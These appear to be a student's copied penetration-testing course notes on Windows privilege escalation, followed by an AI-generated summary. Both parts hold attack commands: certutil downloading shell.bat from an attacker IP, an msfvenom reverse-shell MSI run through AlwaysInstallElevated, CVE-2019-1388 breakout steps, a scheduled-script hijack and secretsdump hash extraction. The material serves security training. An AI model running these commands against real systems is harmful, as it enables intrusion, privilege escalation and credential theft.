Living Off The Land Binaries and Scripts (LOLBAS)
The LOLBAS project documents binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems. Each of these binaries, scripts and libraries is a Microsoft-signed file that is either native to the operating system or can be downloaded directly from Microsoft and have unexpected functionality useful to an attacker. Some interesting functionality may include:

Code execution	Code compilation	File transfers
Persistence	UAC bypass	Credential theft
Dumping process memory	Keylogging	Evasion
DLL hijacking		
Transferring File with Certutil
One classic example is certutil.exe, whose intended use is for handling certificates but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file.

  Miscellaneous Techniques
PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
Encoding File with Certutil
We can use the -encode flag to encode a file using base64 on our Windows attack host and copy the contents to a new file on the remote system.

  Miscellaneous Techniques
C:\htb> certutil -encode file1 encodedfile

Input Length = 7
Output Length = 70
CertUtil: -encode command completed successfully
Decoding File with Certutil
Once the new file has been created, we can use the -decode flag to decode the file back to its original contents.

  Miscellaneous Techniques
C:\htb> certutil -decode encodedfile file2

Input Length = 70
Output Length = 7
CertUtil: -decode command completed successfully.
A binary such as rundll32.exe can be used to execute a DLL file. We could use this to obtain a reverse shell by executing a .DLL file that we either download onto the remote host or host ourselves on an SMB share.

It is worth reviewing this project and becoming familiar with as many binaries, scripts, and libraries as possible. They could prove to be very useful during an evasive assessment, or one in which the client restricts us to only a managed Windows workstation/server instance to test from.

Always Install Elevated
This setting can be set via Local Group Policy by setting Always install with elevated privileges to Enabled under the following paths.

Computer Configuration\Administrative Templates\Windows Components\Windows Installer

User Configuration\Administrative Templates\Windows Components\Windows Installer

Local Group Policy Editor showing Windows Installer settings. 'Always install with elevated privileges' is enabled. Other settings like 'Allow users to browse for source while elevated' are not configured.

Enumerating Always Install Elevated Settings
Let's enumerate this setting.

  Miscellaneous Techniques
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
  Miscellaneous Techniques
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
Our enumeration shows us that the AlwaysInstallElevated key exists, so the policy is indeed enabled on the target system.

Generating MSI Package
We can exploit this by generating a malicious MSI package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.

  Miscellaneous Techniques
MJBUCKNER@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
Executing MSI Package
We can upload this MSI file to our target, start a Netcat listener and execute the file from the command line like so:

  Miscellaneous Techniques
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
Catching Shell
If all goes to plan, we will receive a connection back as NT AUTHORITY\SYSTEM.

  Miscellaneous Techniques
MJBUCKNER@htb[/htb]$ nc -lnvp 9443

This issue can be mitigated by disabling the two Local Group Policy settings mentioned above.

CVE-2019-1388
CVE-2019-1388 was a privilege escalation vulnerability in the Windows Certificate Dialog, which did not properly enforce user privileges. The issue was in the UAC mechanism, which presented an option to show information about an executable's certificate, opening the Windows certificate dialog when a user clicks the link. The Issued By field in the General tab is rendered as a hyperlink if the binary is signed with a certificate that has Object Identifier (OID) 1.3.6.1.4.1.311.2.1.10. This OID value is identified in the wintrust.h header as SPC_SP_AGENCY_INFO_OBJID which is the SpcSpAgencyInfo field in the details tab of the certificate dialog. If it is present, a hyperlink included in the field will render in the General tab. This vulnerability can be exploited easily using an old Microsoft-signed executable (hhupd.exe) that contains a certificate with the SpcSpAgencyInfo field populated with a hyperlink.

When we click on the hyperlink, a browser window will launch running as NT AUTHORITY\SYSTEM. Once the browser is opened, it is possible to "break out" of it by leveraging the View page source menu option to launch a cmd.exe or PowerShell.exe console as SYSTEM.

Let's run through the vulnerability in practice.

First right click on the hhupd.exe executable and select Run as administrator from the menu.

User Account Control prompt for HTML Help ActiveX Control. Verified publisher: Microsoft Corporation. File origin: Downloaded from the Internet. Program location: C:\Tools\hhupd.exe. Requires admin username and password. Options: Yes or No.

Next, click on Show information about the publisher's certificate to open the certificate dialog. Here we can see that the SpcSpAgencyInfo field is populated in the Details tab.

Certificate details window for Microsoft Corporation. Fields include Certificate Policies, Key Usage Restriction, and Thumbprint. Policy Information URL: https://www.verisign.com/repository/CPS.

Next, we go back to the General tab and see that the Issued by field is populated with a hyperlink. Click on it and then click OK, and the certificate dialog will close, and a browser window will launch.

Certificate Information window for Microsoft Corporation. Purpose: Ensures software authenticity and protection. Issued by VeriSign Commercial Software Publishers CA. Valid from 4/15/1998 to 4/16/1999.

If we open Task Manager, we will see that the browser instance was launched as SYSTEM.

Browser window showing 404 Error on VeriSign page. Task Manager open, listing multiple chrome.exe processes running under SYSTEM user, and other processes like conhost.exe and FileZilla Server.

Next, we can right-click anywhere on the web page and choose View page source. Once the page source opens in another tab, right-click again and select Save as, and a Save As dialog box will open.

Save As dialog open in Chrome with error message: 'Location is not available. C:\Windows\system32\config\systemprofile\Desktop is unavailable.' Options to save webpage as 'Webpage, Complete' with OK button visible.

At this point, we can launch any program we would like as SYSTEM. Type c:\windows\system32\cmd.exe in the file path and hit enter. If all goes to plan, we will have a cmd.exe instance running as SYSTEM.

Command prompt running as NT AUTHORITY\SYSTEM, showing Windows version. 'whoami' command confirms SYSTEM user. Save As dialog open with path C:\Windows\System32\cmd.exe.

Microsoft released a patch for this issue in November of 2019. Still, as many organizations fall behind on patching, we should always check for this vulnerability if we gain GUI access to a potentially vulnerable system as a low-privilege user.

This link lists all of the vulnerable Windows Server and Workstation versions.

Note: The steps above were done using the Chrome browser and may differ slightly in other browsers.

<SNIP>
By default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in C:\Windows\System32\Tasks, which standard users do not have read access to. It is not uncommon for system administrators to go against security practices and perform actions such as provide read or write access to a folder usually reserved only for administrators. We (though rarely) may encounter a scheduled task that runs as an administrator configured with weak file/folder permissions for any number of reasons. In this case, we may be able to edit the task itself to perform an unintended action or modify a script run by the scheduled task.

Checking Permissions on C:\Scripts Directory
Consider a scenario where we are on the fourth day of a two-week penetration test engagement. We have gained access to a handful of systems so far as unprivileged users and have exhausted all options for privilege escalation. Just at this moment, we notice a writeable C:\Scripts directory that we overlooked in our initial enumeration.

  Miscellaneous Techniques
C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
C:\Scripts
  RW BUILTIN\Users
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
We notice various scripts in this directory, such as db-backup.ps1, mailbox-backup.ps1, etc., which are also all writeable by the BUILTIN\USERS group. At this point, we can append a snippet of code to one of these files with the assumption that at least one of these runs on a daily, if not more frequent, basis. We write a command to send a beacon back to our C2 infrastructure and carry on with testing. The next morning when we log on, we notice a single beacon as NT AUTHORITY\SYSTEM on the DB01 host. We can now safely assume that one of the backup scripts ran overnight and ran our appended code in the process. This is an example of how important even the slightest bit of information we uncover during enumeration can be to the success of our engagement. Enumeration and post-exploitation during an assessment are iterative processes. Each time we perform the same task across different systems, we may be gaining more pieces of the puzzle that, when put together, will get us to our goal.

User/Computer Description Field
Checking Local User Description Field
Though more common in Active Directory, it is possible for a sysadmin to store account details (such as a password) in a computer or user's account description field. We can enumerate this quickly for local users using the Get-LocalUser cmdlet.

  Miscellaneous Techniques
PS C:\htb> Get-LocalUser

----            ------- -----------
Administrator   True    Built-in account for administering the computer/domain
DefaultAccount  False   A user account managed by the system.

Enumerating Computer Description Field with Get-WmiObject Cmdlet
We can also enumerate the computer description field via PowerShell using the Get-WmiObject cmdlet with the Win32_OperatingSystem class.

The most vulnerable box ever!
Mount VHDX/VMDK
During our enumeration, we will often come across interesting files both locally and on network share drives. We may find passwords, SSH keys or other data that can be used to further our access. The tool Snaffler can help us perform thorough enumeration that we could not otherwise perform by hand. The tool searches for many interesting file types, such as files containing the phrase "pass" in the file name, KeePass database files, SSH keys, web.config files, and many more.

Three specific file types of interest are .vhd, .vhdx, and .vmdk files. These are Virtual Hard Disk, Virtual Hard Disk v2 (both used by Hyper-V), and Virtual Machine Disk (used by VMware). Let's assume that we land on a web server and have had no luck escalating privileges, so we resort to hunting through network shares. We come across a backups share hosting a variety of .VMDK and .VHDX files whose filenames match hostnames in the network. One of these files matches a host that we were unsuccessful in escalating privileges on, but it is key to our assessment because there is an Active Domain admin session. If we can escalate to SYSTEM, we can likely steal the user's NTLM password hash or Kerberos TGT ticket and take over the domain.

If we encounter any of these three files, we have options to mount them on either our local Linux or Windows attack boxes. If we can mount a share from our Linux attack box or copy over one of these files, we can mount them and explore the various operating system files and folders as if we were logged into them using the following commands.

Mount VMDK on Linux
  Miscellaneous Techniques
MJBUCKNER@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
Mount VHD/VHDX on Linux
  Miscellaneous Techniques
MJBUCKNER@htb[/htb]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
In Windows, we can right-click on the file and choose Mount, or use the Disk Management utility to mount a .vhd or .vhdx file. If preferred, we can use the Mount-VHD PowerShell cmdlet. Regardless of the method, once we do this, the virtual hard disk will appear as a lettered drive that we can then browse.

Disk Management window showing Disk 0 with 39.98 GB, containing a 450 MB Recovery Partition, 99 MB EFI System Partition, and 39.45 GB NTFS Primary Partition. CD-ROM 0 labeled 'Hygiene (D:)' with 479 MB CDFS.

For a .vmdk file, we can right-click and choose Map Virtual Disk from the menu. Next, we will be prompted to select a drive letter. If all goes to plan, we can browse the target operating system's files and directories. If this fails, we can use VMWare Workstation File --> Map Virtual Disks to map the disk onto our base system. We could also add the .vmdk file onto our attack VM as an additional virtual hard drive, then access it as a lettered drive. We can even use 7-Zip to extract data from a .vmdk file. This guide illustrates many methods for gaining access to the files on a .vmdk file.

Retrieving Hashes using Secretsdump.py
Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the C:\Windows\System32\Config directory and pull down the SAM, SECURITY and SYSTEM registry hives. We can then use a tool such as secretsdump to extract the password hashes for local users.

  Miscellaneous Techniques
MJBUCKNER@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

GPT SUMMARY 

🪓 LOLBAS (Living Off the Land Binaries and Scripts)
Big Picture:
LOLBAS = using built-in Windows binaries or scripts (Microsoft-signed) for malicious purposes. Think: no need to bring tools, just abuse what’s already there.

🔧 Common Use Cases:
Code execution: rundll32, wmic, mshta, etc.

File transfers: certutil, bitsadmin, powershell

Persistence & UAC bypass: abuse of trusted binaries

Credential theft / evasion / memory dumping: reg, findstr, tasklist, rundll32, etc.

📥 Transferring & Encoding Files with certutil
Tool: certutil.exe
Usage:

Download file:

powershell
Copy
Edit
certutil.exe -urlcache -split -f http://<attacker_ip>/shell.bat shell.bat
Base64 encode a file:

powershell
Copy
Edit
certutil -encode file1 encodedfile
Decode a base64 file:

powershell
Copy
Edit
certutil -decode encodedfile file2
✅ Why it matters: It’s already on Windows — no AV flags.

⚙️ AlwaysInstallElevated Abuse
If both:

HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1

HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1

✅ You can escalate to SYSTEM using .msi files.

Steps:

Create malicious MSI with msfvenom

bash
Copy
Edit
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi > shell.msi
Execute as:

powershell
Copy
Edit
msiexec /i shell.msi /quiet /qn /norestart
🎯 Outcome: Reverse shell as SYSTEM
🔒 Mitigation: Disable those two Group Policy settings.

🔐 CVE-2019-1388 – UAC Bypass via Cert Viewer
If hhupd.exe (signed with a cert that includes a clickable link):

Run it as administrator.

Open the cert details → click the hyperlink.

A browser launches as SYSTEM.

Use “View Page Source” → Save As → launch cmd.

✅ Result: cmd running as SYSTEM.
💡 Good example of GUI-access-dependent privesc.

⏱️ Scheduled Tasks for Privesc
Enumerate tasks:

powershell
Copy
Edit
Get-ScheduledTask | Select TaskName, State
Or:

cmd
Copy
Edit
schtasks /query /fo LIST /v
🚩 Look for:

Tasks running as SYSTEM

Scripts/binaries stored in writable folders like C:\Scripts

Check permissions:

cmd
Copy
Edit
accesschk64.exe -s -d C:\Scripts\
🔥 If you can write to a script being executed by a SYSTEM-level task — that’s privesc.

🧾 User/Computer Description Field
Check for passwords/info accidentally left in user descriptions:

powershell
Copy
Edit
Get-LocalUser
Or for the machine:

powershell
Copy
Edit
Get-WmiObject -Class Win32_OperatingSystem | select Description
🧠 Admins sometimes store creds in these fields (happens more than you'd think).

💿 Mounting VHDX/VMDK for Hash Dumping
Found .vhd, .vhdx, or .vmdk files? Mount them.

Linux:

bash
Copy
Edit
guestmount -a file.vmdk -i --ro /mnt/vmdk
Then grab:

SAM

SYSTEM

SECURITY

Use:

bash
Copy
Edit
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
💥 Goal: Dump hashes, possibly re-use old creds or lateral move.

🪞 Key Themes to Remember:
Attack Type	Tool or Trick	Notes
File transfer	certutil	Base64 encoding/decoding too
SYSTEM Shell	.msi w/ AlwaysInstallElevated	Requires both registry keys set
GUI UAC Bypass	CVE-2019-1388 (hhupd.exe)	Browser opens as SYSTEM
Script hijack	Scheduled task using writable script	Real-world privesc via misconfig
Description field	Get-LocalUser / Get-WmiObject	Look for creds
VHD/VMDK	Mount + secretsdump	Get old passwords, hashes
